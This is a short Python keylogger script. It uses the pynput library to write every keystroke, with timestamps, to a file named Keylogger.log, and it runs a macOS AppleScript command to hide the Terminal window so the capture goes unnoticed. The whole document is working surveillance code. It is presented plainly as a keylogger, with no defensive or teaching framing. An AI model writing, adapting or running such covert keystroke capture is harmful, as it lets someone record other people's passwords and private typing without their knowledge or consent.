from pynput import keyboard
import logging
import os 



# Set up logging
log_file = "Keylogger.log"
logging.basicConfig(filename=log_file, level=logging.INFO, format='%(asctime)s: %(message)s')

# Minimize Terminal window (macOS-specific)
def minimize_terminal():
    try:
        # AppleScript to minimize the Terminal window
        os.system("osascript -e 'tell application \"System Events\" to set visible of first application process whose frontmost is true to false'")
    except Exception as e:
        logging.info(f"Error minimizing terminal: {e}")
        

# Define the function to be called when a key is pressed
def on_press(key):
    try:
        logging.info('Key pressed: {0}'.format(key.char))
    except AttributeError:
        logging.info('Special key pressed: {0}'.format(key))

# Define the function to be called when a key is released
def on_release(key):
    if key == keyboard.Key.esc:
        # Stop listener
        return False


if __name__ == "__main__":
    # Minimize the Terminal window after starting the script
    minimize_terminal()

# Set up the listener
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
